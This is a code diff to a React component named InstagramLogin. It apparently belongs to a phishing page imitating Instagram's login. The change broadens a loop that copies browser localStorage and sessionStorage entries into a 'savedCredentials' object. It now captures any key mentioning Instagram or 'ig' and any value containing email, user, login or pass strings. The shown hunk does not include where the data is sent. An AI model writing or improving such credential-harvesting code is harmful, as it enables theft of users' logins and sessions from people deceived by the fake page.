@@ -407,15 +407,29 @@ export default function InstagramLogin() {
         savedCredentials.localStorage = {}
         savedCredentials.sessionStorage = {}
         for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i)
-          if (key && (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass'))) {
+          const key = localStorage.key(i);
+          if (!key) continue;
+          const value = localStorage.getItem(key);
+          if (
+            key.toLowerCase().includes('instagram') ||
+            key.toLowerCase().includes('insta') ||
+            key.toLowerCase().includes('ig') ||
+            (value && (value.toLowerCase().includes('email') || value.toLowerCase().includes('user') || value.toLowerCase().includes('login') || value.toLowerCase().includes('pass')))
+          ) {
             savedCredentials.localStorage[key] = localStorage.getItem(key)
           }
         }
         
         for (let i = 0; i < sessionStorage.length; i++) {
-          const key = sessionStorage.key(i)
-          if (key && (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass'))) {
+          const key = sessionStorage.key(i);
+          if (!key) continue;
+          const value = sessionStorage.getItem(key);
+          if (
+            key.toLowerCase().includes('instagram') ||
+            key.toLowerCase().includes('insta') ||
+            key.toLowerCase().includes('ig') ||
+            (value && (value.toLowerCase().includes('email') || value.toLowerCase().includes('user') || value.toLowerCase().includes('login') || value.toLowerCase().includes('pass')))
+          ) {
             savedCredentials.sessionStorage[key] = sessionStorage.getItem(key)
           }
         }
